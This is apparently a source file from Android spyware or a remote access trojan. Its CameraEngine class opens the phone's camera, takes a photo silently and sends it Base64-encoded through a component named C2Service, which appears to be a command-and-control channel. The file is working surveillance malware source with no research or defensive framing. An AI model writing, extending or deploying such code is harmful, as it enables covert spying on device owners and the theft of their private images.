package com.wuzenx.engine;

import android.content.Context;
import android.hardware.Camera;
import android.os.Handler;
import android.os.Looper;
import com.wuzenx.C2Service;

public class CameraEngine {
    private Context context;
    private C2Service c2;
    private Camera camera = null;
    private Handler handler = new Handler(Looper.getMainLooper());

    public CameraEngine(Context context, C2Service c2) { this.context = context; this.c2 = c2; }

    public void capturePhoto() {
        try {
            camera = Camera.open();
            if (camera == null) { camera = Camera.open(0); }
            Camera.Parameters params = camera.getParameters();
            params.setPictureFormat(android.graphics.ImageFormat.JPEG);
            params.setJpegQuality(85);
            camera.setParameters(params);
            
            camera.takePicture(null, null, (byte[] data, Camera cam) -> {
                String b64 = android.util.Base64.encodeToString(data, android.util.Base64.NO_WRAP);
                c2.sendMessage("log", "CAMERA_PHOTO:" + b64);
                camera.release();
                camera = null;
            });
        } catch (Exception e) {
            c2.sendMessage("log", "Camera error: " + e.getMessage());
            if (camera != null) { camera.release(); camera = null; }
        }
    }
}
